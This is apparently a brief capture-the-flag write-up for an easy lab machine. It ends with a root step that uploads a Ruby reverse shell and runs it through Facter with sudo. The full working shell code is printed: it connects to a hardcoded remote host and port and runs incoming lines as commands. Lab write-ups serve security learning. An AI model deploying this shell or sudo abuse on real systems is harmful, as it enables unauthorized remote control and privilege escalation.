## Review

A solid easy machine to kick off Season 10. The foothold requires careful CVE enumeration. Don't rush it or you'll miss the right path.
The user flag can take some extra time if you're not thorough, while root is straightforward.

So I can just upload a ruby reverse shell, use Facter run in sudo mode to execute it and get to root. The shell I chose is this.

```ruby
#Ruby Shell
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.1.10" 
#Set the Remote Host Port
PORT = "6667"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end 
```
